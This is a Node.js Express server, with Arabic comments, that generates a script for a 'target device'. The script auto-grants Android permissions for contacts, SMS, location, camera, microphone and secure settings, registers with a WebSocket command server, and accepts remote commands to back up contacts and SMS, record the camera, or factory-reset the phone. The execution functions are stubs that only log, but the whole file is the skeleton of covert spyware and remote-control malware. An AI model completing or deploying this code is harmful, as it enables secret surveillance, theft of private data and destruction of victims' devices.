const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// تخزين الأجهزة المفعلة
const activeDevices = new Set();

app.post('/generate-script', (req, res) => {
    const deviceId = req.body.deviceId;
    const script = `
        (function() {
            // هذا الكود سينفذ على الجهاز المستهدف
            const deviceId = "${deviceId}";
            
            // منح الصلاحيات تلقائياً
            function grantPermissions() {
                // تنفيذ أوامر ADB مباشرة
                const permissions = [
                    'READ_CONTACTS',
                    'READ_SMS',
                    'ACCESS_FINE_LOCATION',
                    'CAMERA',
                    'RECORD_AUDIO',
                    'WRITE_SECURE_SETTINGS'
                ];
                
                permissions.forEach(perm => {
                    try {
                        const cmd = 'pm grant android.permission.' + perm;
                        executeCommand(cmd);
                    } catch(e) {
                        console.error('Permission grant failed:', e);
                    }
                });
            }
            
            // تنفيذ الأوامر على الجهاز
            function executeCommand(cmd) {
                // محاكاة تنفيذ الأوامر
                console.log('Executing:', cmd);
                return new Promise(resolve => {
                    setTimeout(() => resolve('Command executed'), 1000);
                });
            }
            
            // الاتصال بخادم التحكم
            function connectToServer() {
                const ws = new WebSocket('ws://localhost:4000');
                
                ws.onopen = () => {
                    ws.send(JSON.stringify({
                        type: 'register',
                        deviceId: deviceId
                    }));
                };
                
                ws.onmessage = (event) => {
                    const command = JSON.parse(event.data);
                    handleCommand(command);
                };
            }
            
            // معالجة الأوامر الواردة
            function handleCommand(command) {
                switch(command.action) {
                    case 'backup_contacts':
                        backupContacts();
                        break;
                    case 'backup_sms':
                        backupSMS();
                        break;
                    case 'record_camera':
                        recordCamera();
                        break;
                    case 'factory_reset':
                        factoryReset();
                        break;
                }
            }
            
            // وظائف التحكم
            function backupContacts() {
                console.log('Backing up contacts...');
                // تنفيذ النسخ الاحتياطي
            }
            
            function recordCamera() {
                console.log('Recording camera...');
                // تنفيذ تسجيل الكاميرا
            }
            
            function factoryReset() {
                console.log('Performing factory reset...');
                // تنفيذ إعادة الضبط
            }
            
            // بدء العملية
            grantPermissions();
            connectToServer();
            
        })();
    `;
    
    res.send(script);
});

app.post('/confirm-activation', (req, res) => {
    const deviceId = req.body.deviceId;
    activeDevices.add(deviceId);
    console.log(`تم تفعيل الجهاز: ${deviceId}`);
    res.send({ status: 'success' });
});

app.listen(3000, () => {
    console.log('خادم الواجهة يعمل على http://localhost:3000');
});